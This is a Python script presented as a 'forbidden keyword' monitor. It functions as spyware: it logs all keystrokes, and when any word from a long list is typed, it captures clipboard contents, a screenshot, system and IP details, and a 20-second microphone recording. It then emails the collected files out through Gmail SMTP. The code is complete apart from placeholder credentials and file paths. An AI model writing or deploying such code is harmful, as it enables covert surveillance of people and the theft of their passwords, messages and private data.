import time
import winsound
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyperclip
import pyautogui
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
from pynput import keyboard
from cryptography.fernet import Fernet
import platform
import socket
from requests import get
import base64

# Define your list of forbidden keywords
forbidden_keywords = ["cybercrime", "crime", "cybersecurity", "hacking", "phishing", "scam", "malware", "virus",
    "ransomware", "trojan", "spyware", "worm", "exploit", "zero-day", "denial", "service",
    "DoS", "DDoS", "brute", "force", "social", "engineering", "man-in-the-middle", "spoofing",
    "password", "cracking", "credential", "stuffing", "SQL", "injection", "cross-site", "scripting",
    "XSS", "buffer", "overflow", "pharming", "botnet", "rootkit", "keylogger", "keystroke",
    "logging", "identity", "theft", "data", "leak", "breach", "attack", "hacktivism",
    "cyberterrorism", "cyberespionage", "cyberwarfare", "cryptojacking", "cyberbullying",
    "ransom", "cyberextortion", "carding", "skimming", "fraud", "banking", "wire",
    "spear", "whaling", "vishing", "smishing", "watering", "hole", "email", "DNS",
    "IP", "media", "online", "investment", "ponzi", "scheme", "pyramid", "advanced",
    "fee", "job", "romance", "catfishing", "click", "auction", "counterfeit", "goods",
    "darknet", "criminal", "malvertising", "blackmail", "stalking", "harassment", "deep",
    "fake", "defamation", "trespass", "vandalism", "vandal", "stalker", "troll", "terrorist",
    "saboteur", "spy", "offender", "culprit", "transgressor", "mischief-maker", "wrongdoing",
    "misdeed", "lawbreaking", "offense", "violation", "infraction", "infringement", "trespasser",
    "insubordination", "revolt", "sedition", "resistance", "disorder", "disturbance",
    "fracas", "row", "shindy", "ruckus", "dust-up", "turmoil", "uproar", "ruction",
    "commotion", "fuss", "shindig", "havoc", "struggle", "disruption", "tumult", "anarchy",
    "riot", "outrage", "scandal", "insurrection", "mutiny", "uprising", "disobedience",
    "noncompliance", "defiance", "rebellion", "dissent", "noncooperation", "misconduct", "trouble",
    "conflict", "hostility", "antagonism", "ill-will", "animosity", "belligerence", "enmity", "resentment",
    "rancor", "hatred", "bitterness", "malice", "vindictiveness", "spite", "venom", "grudge",
    "contention", "argument", "quarrel", "dispute", "altercation", "fight", "clash", "combat",
    "skirmish", "tussle", "melee", "unauthorized", "access", "security", "suspicious", "activity",
    "behavior", "login", "attempt", "alert", "detection", "prevention", "control", "mitigation",
    "response", "investigation", "incident", "report", "management", "notification", "communication",
    "resolution", "recovery", "documentation", "training", "awareness", "threat", "risk", "vulnerability",
    "confidential", "proprietary", "private", "personal", "sensitive", "policy", "procedure", "guideline",
    "requirement", "measure", "protocol", "standard", "framework", "regulation", "law", "compliance",
    "governance", "full", "version", "crack", "windows", "android", "mac", "laptop", "PC",
    "bit"]

# Your email configuration
sender_email = ' '
receiver_email = ''
email_password = 'This means Email passkey'

# Define paths for storing encrypted data
keylog_file_path = 'FILE PATH:where you want to save'
sys_file_path = 'FILE PATH:where you want to save'
clipboard_file_path = 'FILE PATH:where you want to save'
screenshot_file_path = 'FILE PATH:where you want to save'

# Initialize a variable to store the time when forbidden words were detected
forbidden_words_detected_time = None

# Generate or load the encryption key
key = ''  # Replace with your actual encryption key
cipher_suite = Fernet(key)

# Initialize a list to store the captured keystrokes
keylog_data = []

# Define delay after detecting forbidden words (in seconds)
DELAY_AFTER_FORBIDDEN_WORDS = 5

# Define the duration of audio recording (in seconds)
RECORD_DURATION = 20

# Function to check for forbidden keywords in the captured keystrokes
def check_forbidden_keywords(keylog_content):
    global forbidden_words_detected_time

    for keyword in forbidden_keywords:
        if keyword in keylog_content:
            if forbidden_words_detected_time is None:
                forbidden_words_detected_time = time.time()  # Record the time when forbidden words were detected
            elif time.time() - forbidden_words_detected_time >= DELAY_AFTER_FORBIDDEN_WORDS:
                save_and_encrypt_data()
                trigger_alarm()
                forbidden_keywords_triggered()  # Trigger microphone recording
                forbidden_words_detected_time = None  # Reset the detection time
            break

# Function to save and encrypt keylog, system info, clipboard, and screenshot
def save_and_encrypt_data():
    # Save and encrypt keylog data
    with open(keylog_file_path, 'wb') as file:
        keylog_content = ''.join(keylog_data).encode('utf-8')
        encrypted_content = cipher_suite.encrypt(keylog_content)
        file.write(encrypted_content)

    # Save and encrypt system info
    try:
        with open(sys_file_path, 'wb') as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)

            try:
                public_ip = get("https://api.ipify.org").text
                public_ip_line = "Public Ip Address: " + public_ip + '\n'
                f.write(public_ip_line.encode('utf-8'))

            except Exception:
                error_message = "Couldn't get Public IP Address (most likely max query)\n"
                f.write(error_message.encode('utf-8'))

            f.write(("Processor: " + platform.processor() + '\n').encode('utf-8'))
            f.write(("System: " + platform.system() + " " + platform.version() + '\n').encode('utf-8'))
            f.write(("Machine: " + platform.machine() + "\n").encode('utf-8'))
            f.write(("Hostname: " + hostname + "\n").encode('utf-8'))
            f.write(("Private Ip Address: " + IPAddr + "\n").encode('utf-8'))

        # Read the content of the file
        with open(sys_file_path, 'rb') as f:
            sys_info_content = f.read()

        if sys_info_content:
            # Encrypt the content
            encrypted_sys_info_content = cipher_suite.encrypt(sys_info_content)

            # Write the encrypted content back to the file
            with open(sys_file_path, 'wb') as f:
                f.write(encrypted_sys_info_content)

        else:
            print("System info content is empty. Encryption aborted.")

    except Exception as e:
        print("Error during system info encryption:", str(e))

    # Save and encrypt clipboard content
    clipboard_content = pyperclip.paste()
    encrypted_clipboard_content = cipher_suite.encrypt(clipboard_content.encode('utf-8'))
    with open(clipboard_file_path, 'wb') as file:
        file.write(encrypted_clipboard_content)

    # Save screenshot (without encryption)
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_file_path)

# Function to trigger an alarm
def trigger_alarm():
    winsound.Beep(1000, 500)  # Adjust frequency and duration as needed
    print("Alarm triggered!")

# Function to send an email with attachments
def send_email_with_attachments():
    # Create a multipart message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = 'Sensitive Information Detected'

    # Attach keylog file
    with open(keylog_file_path, 'rb') as file:
        keylog_content = file.read()
    attachment = MIMEText(base64.b64encode(keylog_content).decode('utf-8'))
    attachment.add_header('Content-Disposition', 'attachment', filename='keylog_encrypted.txt')
    msg.attach(attachment)

    # Attach system info file
    with open(sys_file_path, 'rb') as file:
        sys_info_content = file.read()
    attachment = MIMEText(base64.b64encode(sys_info_content).decode('utf-8'))
    attachment.add_header('Content-Disposition', 'attachment', filename='systeminfo_encrypted.txt')
    msg.attach(attachment)

    # Attach clipboard file
    with open(clipboard_file_path, 'rb') as file:
        clipboard_content = file.read()
    attachment = MIMEText(base64.b64encode(clipboard_content).decode('utf-8'))
    attachment.add_header('Content-Disposition', 'attachment', filename='clipboard_encrypted.txt')
    msg.attach(attachment)

    # Attach screenshot file
    with open(screenshot_file_path, 'rb') as file:
        screenshot_content = file.read()
    attachment = MIMEImage(screenshot_content)
    attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
    msg.attach(attachment)

    # Connect to SMTP server and send email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, email_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

# Listener for capturing keyboard input
def on_press(key):
    global keylog_data, forbidden_words_detected_time

    try:
        # Check if the pressed key is alphanumeric or a space
        if hasattr(key, 'char') and (key.char.isalnum() or key == keyboard.Key.space):
            keylog_data.append(key.char)
        else:
            # If the pressed key is not alphanumeric or a space, append it directly
            keylog_data.append(str(key).replace("'", ""))
    except AttributeError:
        # Handle special keys
        keylog_data.append(str(key).replace("'", ""))

    # Convert the keylog data to a string
    keylog_content = ''.join(keylog_data).lower()

    # Check for forbidden keywords
    check_forbidden_keywords(keylog_content)


def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to record audio from the microphone and save to a WAV file
def record_microphone_and_save(filename):
    print("Recording microphone... Speak now.")
    audio_data = sd.rec(int(RECORD_DURATION * 44100), samplerate=44100, channels=2, dtype=np.float32)
    sd.wait()  # Wait for recording to complete
    print("Microphone recording complete.")

    # Save audio data to a WAV file
    wav.write(filename, 44100, audio_data)
    print(f"Microphone recording saved to {filename}")

# Function to trigger when forbidden keywords are detected
def forbidden_keywords_triggered():
    print("Forbidden keywords detected! Initiating microphone recording.")
    audio_filename = 'FILE PATH:where you want to save'  # Change the path and filename as needed
    record_microphone_and_save(audio_filename)
    # You can add further processing here if needed

    # Wait for 30seconds before sending the email
    print("Waiting for 30 seconds before sending email...")
    time.sleep(30)  # 30seconds
    print("Sending email...")
    send_email_with_attachments()
    print("Email sent.")

# Start listening for keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

